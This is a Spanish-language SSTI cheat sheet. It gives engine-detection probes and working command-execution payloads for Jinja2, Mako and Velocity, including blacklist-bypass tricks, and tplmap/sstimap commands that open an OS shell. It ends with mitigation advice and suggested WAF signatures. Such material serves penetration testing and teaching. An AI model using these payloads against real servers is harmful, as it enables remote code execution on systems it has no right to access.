---
title: SSTI — de una plantilla a ejecución de comandos
tags: [web, ssti, jinja2, mako, velocity]
---

# SSTI: cuando la plantilla evalúa lo que envías

[🇬🇧 English](ssti.en.md) | **Español**

## 1. Detección

El servidor refleja tu entrada dentro de una plantilla. Prueba operadores por motor:

| Payload | Motor si devuelve `49` |
|---|---|
| `{{7*7}}` | Jinja2, Twig, Nunjucks |
| `${7*7}` | Mako, JSP EL, Freemarker |
| `#{7*7}` | Ruby (ERB/Slim) |
| `%{7*7}` | Thymeleaf, Struts |
| `<%= 7*7 %>` | ERB, EJS |

Si `{{7*7}}` sale literal, el motor no es Jinja; si sale `49`, ya tienes ejecución de expresiones.

## 2. Jinja2 (Flask)

Lo mínimo para leer configuración y llegar a `os`:

```jinja
{{ config }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
```

Con blacklist de palabras (`os`, `system`, `_`), se sustituye por filtros y concatenación:

```jinja
{{ lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')() }}
{% set x = 'o' ~ 's' %}{{ cycler.__init__.__globals__[x].popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

`{{ ''.__class__.__mro__[1].__subclasses__() }}` sirve para inventariar clases cuando no hay `os` accesible.

## 3. Mako

`self.module` expone el módulo generado y, desde ahí, el intérprete:

```mako
${self.module.cache.util.os.popen('id').read()}
${self.module.cache.util.os.system('id')}
```

## 4. Velocity (Java)

Con `#set` y reflexión (CVE-2020-13936 y similares):

```velocity
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime').getRuntime())
#set($p=$rt.exec('id'))
#set($sc=$p.getInputStream())
```

La salida se lee con un `Scanner` o se escribe en la respuesta; el patrón es siempre `Class.forName` → `Runtime.exec`.

## 5. Automatizar

```bash
tplmap -u 'http://<HOST>/?name=*' --os-shell
sstimap -u 'http://<HOST>/?name=INJECT'
```

Prueban motores, detectan el contexto y construyen el payload. Úsalos para confirmar, no para entender: en el writeup conviene el payload mínimo que funcionó.

## 6. Errores típicos

- **`49` pero `config` vacío** → el motor no es Flask/Jinja; prueba Twig (`{{_self.env...}}`).
- **`SecurityError` / `UndefinedError`** → sandbox de Jinja (`SandboxedEnvironment`); hay que escapar del sandbox, no del blacklist.
- **El payload se URL-encodea** → codifica solo los caracteres necesarios y comprueba si el parámetro se decodifica una o dos veces.
- **Comillas filtradas** → usa `attr()` con `request.args` o concatenación sin comillas.

## 7. Detección y mitigación

- Nunca renderizar plantillas con entrada de usuario; usa variables, no plantillas dinámicas.
- Sandbox real (`SandboxedEnvironment`) y lista blanca de filtros.
- WAF con firmas de `{{`, `${`, `__class__`, `__globals__`; no sustituye al sandbox.
- Revisar dependencias (Velocity, Twig, Freemarker) y sus CVEs de ejecución de plantillas.

MITRE: T1059, T1190.
